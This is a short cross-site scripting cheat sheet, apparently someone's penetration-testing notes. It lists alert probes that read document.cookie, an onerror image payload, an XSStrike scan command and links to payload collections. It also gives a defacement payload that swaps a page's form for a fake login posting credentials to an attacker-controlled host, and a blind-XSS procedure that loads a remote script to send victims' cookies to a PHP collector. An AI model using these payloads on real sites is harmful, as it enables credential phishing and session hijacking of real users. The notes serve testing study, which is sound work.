# XSS
## Testing for XSS

```javascript
<script>alert(window.origin)</script>
```
```javascript
<script>alert(document.cookie)</script>
```

## DOM XSS
```javascript
<img src="" onerror=alert(document.cookie)>
```
## Automated Discovery
```zsh
python3 xsstrike.py -u "http://<IP:PORT>/<page>.php?<param>=<value>" 
```

## XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

## For Defacement

```javascript
document.write('<h3>Please login to continue</h3><form action=http://<IP>/index_cred_s.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('<original form name>').remove();

```


## For forms

1. Make a payload for each entry to check if any is vulnerable to XSS by trying to get a hosted resource. 
```javascript
<script src=http://<IP>/<form-field></script>
```
2. We will recieve a 404 error on the webserver for that field
3. Send this payload in the vulnerable field: 
```javascript
<script src=http://<IP>/cookie_s_script.js></script>
 ```
 4. This script calls a PHP that gets the cookies.
 

## Blind XSS
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss
